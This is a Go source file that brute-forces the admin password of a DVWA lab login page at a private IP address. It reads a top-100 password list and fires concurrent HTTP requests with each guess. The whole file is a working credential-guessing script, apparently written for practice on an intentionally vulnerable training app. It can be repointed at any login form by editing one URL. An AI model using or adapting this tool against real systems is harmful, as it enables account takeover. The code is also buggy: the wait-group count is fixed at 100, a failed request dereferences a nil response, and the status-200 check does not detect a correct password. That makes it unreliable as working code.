package main

import (
	"bufio"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"sync"
)
//
//func req(url_ string)(*http.Response, error){
//	ret_, err_ := http.Get(url_)
//	return ret_, err_
//}

func main()  {
	var wg sync.WaitGroup
	wg.Add(100)
	filePath := "C:\\Users\\Zank\\go\\src\\brute\\password-top100.txt"
	f, err := os.Open(filePath)
	if err != nil{
		fmt.Println("err:", err)
	}
	lines := bufio.NewReader(f)
	for {
		line, err := lines.ReadString('\n')
		line = strings.Replace(line, "\n", "", -1)
		if err != nil || io.EOF == err {  // err ==io.EOF 的时候其实还有一行数据，看到io.EOF就跳出而不读取就跳出的话会丢失
			if line ==""{
				break
			}
		}
		url := "http://192.168.124.26/dvwa/vulnerabilities/brute/?username=admin&password=" + string(line) + "&Login=Login#"
		go func(url string, wg *sync.WaitGroup) {
			//fmt.Println(url)

			res, err := http.Get(url)
			if err != nil {
				fmt.Println("err:", err)
			}
			if res.StatusCode == 200 {
				fmt.Println(*res)
				//fmt.Println(res)
			}

			wg.Done()
		}(url, &wg)

	}
	wg.Wait()

	defer f.Close()

}
